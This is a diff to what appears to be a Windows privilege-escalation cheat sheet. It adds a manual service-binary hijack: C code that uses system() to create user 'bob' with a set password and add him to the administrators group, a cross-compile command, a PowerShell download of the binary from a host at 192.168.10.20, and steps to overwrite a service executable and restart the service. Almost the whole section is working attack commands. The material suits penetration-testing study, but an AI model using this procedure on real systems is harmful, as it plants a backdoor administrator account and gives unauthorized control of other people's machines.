@@ -91,6 +91,32 @@ or
 shutdown /r
 ```
 
+-> Exploitation - Manually
+* Create a file TestService.c
+```
+#include <stdlib.h>
+int main ()
+{
+  int i;
+  i = system ("net user bob password@123 /add");
+  i = system ("net localgroup administrators bob /add"); 
+  return 0;
+}
+```
+```cmd
+x86_64-w64-mingw32-gcc TestService.c -o TestService.exe
+```
+```powershell
+iwr -uri http://192.168.10.20/TestService.exe -Outfile TestService.exe
+```
+```cmd
+copy .\TestService.exe "C:\Program Files\My Program\My service\TestService.exe"
+```
+```powershell
+Stop-Service TestService
+Start-Service TestService
+```
+
 -> Exploitation - PowerUp.ps1
 ```powershell
 .\PowerUp.ps1
